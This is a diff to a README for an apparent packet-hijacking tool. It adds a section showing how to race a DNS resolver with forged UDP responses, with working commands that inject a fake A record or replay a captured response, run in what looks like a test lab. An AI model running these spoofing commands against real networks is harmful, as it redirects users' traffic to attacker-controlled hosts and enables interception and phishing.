@@ -49,6 +49,30 @@ root@ecs-c5a4:~# curl http://169.254.169.254
 flag{test}
 ```
 
+### 3. hijack dns
+
+DNS hijack sniffs UDP queries to a resolver and races it with a forged response.
+`-i`/`-p` are the resolver's IP and port (usually 53). Two ways to supply the
+answer:
+
+#### 3.1 auto-construct (A record)
+
+```
+root@ecs-c5a4:~# ./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns --dns-domain example.com --dns-ip 1.2.3.4 -k &
+root@ecs-c5a4:~# dig @8.8.8.8 example.com +short
+1.2.3.4
+```
+
+#### 3.2 raw response file (any record type)
+
+Prepare a captured DNS response (its transaction ID will be rewritten per query):
+
+```
+root@ecs-c5a4:~# dig @8.8.8.8 example.com > /dev/null  # warm cache as needed
+root@ecs-c5a4:~# tcpdump -i eth0 -c 1 -w resp.bin 'src 8.8.8.8 and udp and port 53'
+root@ecs-c5a4:~# ./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns -f resp.bin -k &
+```
+
 ## bpf
 
 ### method 1
